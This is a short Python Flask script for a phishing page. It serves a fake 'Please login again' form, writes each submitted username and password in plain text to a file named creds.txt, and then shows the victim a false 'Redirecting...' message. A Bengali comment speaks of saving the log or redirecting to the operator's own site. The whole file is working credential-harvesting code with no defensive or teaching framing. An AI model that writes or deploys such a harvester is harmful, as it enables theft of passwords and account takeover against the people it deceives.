from flask import Flask, request, render_template_string
import os
app = Flask(__name__)

PHISH_HTML = """
<!DOCTYPE html>
<html>
<head><title>Login Required</title></head>
<body>
    <h2>Please login again</h2>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(PHISH_HTML)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pwd = request.form.get('password')
    # লগ সংরক্ষণ বা নিজের সাইটে রিডাইরেক্ট
    with open("creds.txt", "a") as f:
        f.write(f"{user}:{pwd}\n")
    return "Information received. Redirecting...", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
